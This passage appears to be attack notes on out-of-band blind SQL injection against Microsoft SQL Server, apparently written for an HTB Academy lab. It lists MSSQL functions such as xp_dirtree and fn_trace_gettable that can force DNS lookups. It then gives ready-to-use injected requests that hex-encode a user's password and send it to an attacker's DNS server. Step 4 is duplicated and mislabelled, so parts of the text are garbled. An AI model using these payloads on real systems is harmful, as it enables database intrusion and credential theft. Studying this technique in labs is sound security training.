Is a particular ex-filtration that occurs on another band(carrier) and in this example will be performed over DNS.


### Limitations
1)We need to setup a DNS/MITM(InteractSH) in order to sniff the incoming request
2)Every DNS record can be max 63 chars long which makes it a bit difficult to handle as you need to truncate the request.

### How does it work?
Basically the idea is to setup a MITM interceptor on example "something.evil.com" and send the query towards our server via xp_dirtree. Doing so the response will be saved into the first part of the DNS record.
```
master..xp_dirtree 		DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');
master..xp_fileexist 	DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');
master..xp_subdirs 		DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');
sys.dm_os_file_exists 	DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');
fn_trace_gettable 		DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);
fn_get_audit_file 		DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
```


### Attack scenario
1)You will use T as carrier, but will also declare A & B to bypass the 63 char length... Doing so the data will be split in 2 parts if exceed 63 chars length.
`DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63);`

2)Chain together with one of the functions named before to perform the actual extrapolation towards your MITM interceptor
```
DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');
```



# Example:
You found a SQLi under GET `/api/check-username.php?u=maria'+DB_NAME()--+-`

1)Get a DNS in https://app.interactsh.com/#/ 

2)Setup a new zone in your dns that resolves blindsqli.academy.htb and a A record under it @=VICTIMIP

3)Start easy by getting the DB name(you might need to URL encode it so it will pass it)
```
/api/check-username.php?u=maria';DECLARE @T VARCHAR(1024); SELECT @T=(SELECT DB_NAME()); SELECT * FROM fn_trace_gettable('\\'+@T+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

4)Get the tables from db SQLi into UA header(split in 2 to bypass the maxlenghtdns=63char plus exfil to victims DNS server(Will convert to HEX as well)
```
/api/check-username.php?u=maria';DECLARE @T VARCHAR(1024); SELECT @T=(SELECT DB_NAME()); SELECT * FROM fn_trace_gettable('\\'+@T+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

4)Form your payload to ex-filtrate data into User Agent header that will split in 2 to bypass the maxlenghtdns=63char plus exfil to victims DNS server(Will convert to HEX as well)
```
/api/check-username.php?u=maria';DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) from users WHERE username='maria'; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

5)Check the logs 
6)Decode the result from HEX to clear-text and enjoy

